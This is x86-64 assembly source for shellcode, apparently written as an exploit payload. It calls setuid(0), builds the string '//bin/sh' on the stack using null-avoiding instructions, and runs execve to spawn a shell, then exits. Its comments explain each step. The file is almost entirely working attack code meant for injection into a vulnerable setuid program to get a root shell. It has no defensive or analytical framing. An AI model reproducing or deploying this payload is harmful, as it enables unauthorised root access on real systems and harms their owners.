section .text

global _start

_start:

; setuid(uid_t uid)
xor rax, rax	;initialise rax and rdi
mov al, 105
xor rdi, rdi
syscall		; sys_setuid -- setuid(0)
xor rax, rax	; clean rax from the returned value

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;


;int execve(const char *filename, char *const argv[], char *const envp[])

;push NULL  to get ready for execve the argv[] needs to terminate with NULL
push rdi	;rdi = NULL from before

;	mov rdx, rsp;rdx the 3rd arg points to NULL

;push "//bin/sh" on stack to get ready for execve
;"//bin/sh" = 2f, 2f, 62, 69,   6e, 2f, 73, 68

;mov rdi, '//bin/sh'
;push rdi

push 0x69622f2f
mov dword [rsp+4], 0x68732f6e


;;;;;;;;;;;;;;;;;;;--testing--;;;;;;;;;;;;;;;;;;;;

;mov rax, 1
;mov rdi, 1
;mov rsi, rsp
;mov rdx, 16
;syscall
;xor rax, rax
;xor rdi, rdi
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

mov rdi, rsp	;rdi points to the start of the string on stack
;	mov rsi, rdi	;rsi points to the start of the array of strs ending with a null pointer
add rsp, 16	;restore stack
	xor rdx, rdx	;envp[] = NULL we dont have environment something

xor rsi, rsi

mov al, 59	;set rax for syscall
syscall
xor rax, rax	;clean rax from the returned value

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;


;exit(int status)
mov al, 60	;set rax for syscall
xor rdi, rdi	;set status on 0
syscall

